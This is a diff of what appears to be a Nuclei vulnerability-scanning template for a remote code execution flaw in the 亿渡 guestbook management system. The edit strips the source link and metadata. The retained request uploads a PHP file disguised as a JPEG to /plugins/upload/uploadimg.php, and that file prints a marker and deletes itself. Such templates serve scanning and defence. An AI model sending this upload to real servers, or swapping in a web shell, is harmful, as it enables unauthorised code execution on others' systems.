@@ -3,12 +3,8 @@ info:
   name: 亿渡留言管理系统 RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kigih985n6dedkky'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kigih985n6dedkky
-    fofa: 暂无
 http:
 - raw:
   - 'POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundarypvPqblfrUine6bl3
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <?php echo "12321";unlink(__FILE__); ?>
